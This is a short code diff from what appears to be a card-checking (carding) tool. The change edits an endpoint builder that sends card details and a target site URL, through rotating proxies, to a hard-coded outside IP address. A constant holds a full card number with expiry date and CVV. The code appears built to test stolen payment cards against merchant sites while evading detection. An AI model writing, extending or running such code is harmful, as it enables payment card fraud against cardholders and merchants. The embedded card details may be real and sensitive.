@@ -9915,12 +9915,10 @@ ${resultsDisplay || "Waiting for results..."}
         return `${randomProxy.ip}:${randomProxy.port}`;
       };
 
-      // API endpoint for checking sites — proxy is OPTIONAL (direct call when empty)
+      // API endpoint for checking sites — proxy is REQUIRED by upstream API
       const API_ENDPOINTS = [
         (site: string, cc: string, proxy: string) =>
-          proxy
-            ? `http://148.230.102.178:8081/?${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy)}`
-            : `http://148.230.102.178:8081/?${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}`,
+          `http://148.230.102.178:8081/?${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy || '')}`,
       ];
       const TEST_CC = "4266841674104656|03|27|908";
 
